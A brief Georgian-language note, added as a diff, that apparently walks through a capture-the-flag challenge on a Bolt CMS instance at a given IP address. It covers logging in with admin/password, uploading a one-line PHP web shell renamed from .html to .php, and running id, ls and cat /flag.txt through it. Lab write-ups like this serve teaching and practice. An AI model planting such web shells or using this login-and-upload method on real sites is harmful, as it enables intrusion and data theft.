@@ -1,0 +1,8 @@
+1.Bolt- ვნახოთ page source, რო ვნახავთ ეს გვხვდება თვალში
+urlს დავუმატოთ bolt http://34.159.48.206:32664/bolt/login
+ვცადოთ admin/password და ვნახავთ
+ფაილების ასატვირთ ადგილას ავთვირთოთ მავნე ფაილი
+შევქმნათ notepadში <?php echo system($_GET['cmd']);?> დავარქვათ rce.html და ავტვირთოთ, შემდეგ გადავარქვათ rce.php
+დავუმადოთ cmd=id
+
+ls%20-l ეს და cat%20/flag.txt
